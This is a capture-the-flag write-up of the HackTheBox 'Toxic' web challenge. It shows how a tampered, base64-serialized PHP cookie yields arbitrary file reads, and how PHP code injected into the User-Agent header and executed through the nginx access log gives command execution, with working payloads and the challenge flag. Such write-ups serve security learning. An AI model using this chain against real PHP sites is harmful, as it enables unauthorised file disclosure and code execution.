---
title: HTB Toxic(Challenge) Writeup
author: Cerberus
date: 2023-02-26
categories: [writeups, HTB]
tags: [LFI, RCE, PHP]
---

## web/Toxic

**Description: Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸**

[zip file](https://app.hackthebox.com/challenges/Toxic) *\*Login to Download*

#### index.php

```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

A few pointers to note in this file

- If the `PHPSESSID` cookie is empty, a new **PageModel** object is created and a file attribute is set pointing to */www/index.html*. It is then serialized and base64 encoded and set in a cookie.

- If the `PHPSESSID` cookie is present, it is simply base64 decoded and unserialized.

### Initial Steps

My initial thoughts were to base64 decode and unserialize the cookie and change the file object to read the flag located in `/flag`. So I took the initial cookie and base64 decoded and unserialized it. It gave me and object which looked like this 

> O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}. 

More info about how serializing and deserializing works can be found at [Insecure Deserialization in PHP](https://redfoxsec.com/blog/insecure-deserialization-in-php/). I tried to change the file to point to `/flag` directory, but seems like there was no flag. On looking closer at other files, there was an `entrypoint.sh` file.

#### entrypoint.sh

```sh
#!/bin/ash

# Secure entrypoint
chmod 600 /entrypoint.sh

# Generate random flag filename
mv /flag /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`

exec "$@"
```

It seems a new random directory for flag is created each time a new instance is spun. So we need to know the exact folder name to read the flag. I decided to look into other files in the folder.

### Analyzing nginx.conf

#### The folder structure

```sh
.
├── build-docker.sh
├── challenge
│   ├── index.html
│   ├── index.php
│   ├── models
│   │   └── PageModel.php
│   └── static
│       ├── basement
│       │   └── help.png
│       ├── css
│       │   └── production.css
│       ├── images
│       │   ├── aircraft.svg
│       │   ├── bucket.svg
│       │   ├── dart-frog.jpg
│       │   ├── drift.svg
│       │   ├── facebook.svg
│       │   ├── favicon.ico
│       │   ├── flask.svg
│       │   ├── instagram.svg
│       │   ├── logo.svg
│       │   ├── newrelic.svg
│       │   ├── presentor.jpg
│       │   ├── ryan1.png
│       │   ├── ryan2.png
│       │   ├── ryan3.png
│       │   ├── ryan4.png
│       │   ├── ryan5.png
│       │   ├── ryan6.png
│       │   ├── segment.svg
│       │   ├── stripe.svg
│       │   ├── twitter.svg
│       │   ├── woman1.jpg
│       │   ├── woman2.jpg
│       │   ├── woman3.jpg
│       │   ├── youtube.svg
│       │   └── zopim.svg
│       └── js
│           └── production.js
├── config
│   ├── fpm.conf
│   ├── nginx.conf
│   └── supervisord.conf
├── Dockerfile
├── entrypoint.sh
└── flag
```

The file that stood out was *nginx.conf*. I decided to give that file a look.

#### nginx.conf

```nginx
user www;
pid /run/nginx.pid;
error_log /dev/stderr info;

events {
    worker_connections 1024;
}

http {
    server_tokens off;
    log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
    access_log /var/log/nginx/access.log docker;

    charset utf-8;
    keepalive_timeout 20s;
    sendfile on;
    tcp_nopush on;
    client_max_body_size 1M;

    include  /etc/nginx/mime.types;

    server {
        listen 80;
        server_name _;

        index index.php;
        root /www;

        location / {
            try_files $uri $uri/ /index.php?$query_string;
            location ~ \.php$ {
                try_files $uri =404;
                fastcgi_pass unix:/run/php-fpm.sock;
                fastcgi_index index.php;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                include fastcgi_params;
            }
        }
    }
}
```

The first thing that caught my attention was the `access_log`, that describes where the logs were stored. Next thing is I wrote a simple PHP script that would create the **PageModel** object with file pointing to `/var/log/nginx/access.log`.

```php
<?php
class PageModel
{
    public $file;
}
$page = new PageModel;
$page->file = '/var/log/nginx/access.log';
print(base64_encode(serialize($page)))
?>
```

After updating the cookie and refreshing the page, we are presented with the contents of *access.log* file.

![Contents of /var/log/nginx/access.log](/assets/img/toxic/toxic.png) 
_Contents of /var/log/nginx/access.log_

### The Final Steps

Next thing we could see is how the log is formatted before it is inserted into the log file. The following line shows the configuration.

> log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';  
  access_log /var/log/nginx/access.log docker;

We could see the user agent being inserted in the log, which is something an user could control. After a few hours of research and after many attempts of trail and error, I came to know about log poisoning. Considering the application is a PHP application we could try to insert some arbitrary PHP code in the user-agent header and check if it gets executed. Inserting this line of code in the header produces the following result.

```php
<?php system('ls -l /');?>
```

![Contents of /var/log/nginx/access.log with contents of / folder](/assets/img/toxic/toxic1.png) 
_Contents of /var/log/nginx/access.log with contents of / folder_

Now since we have the flag folder we could insert another PHP payload in the user-agent header and read the flag.

```php
<?php system('cat /flag_H3zzM');?>
```

![Contents of /var/log/nginx/access.log with flag](/assets/img/toxic/toxic2.png) 
_Contents of /var/log/nginx/access.log with flag_

**Flag: HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}**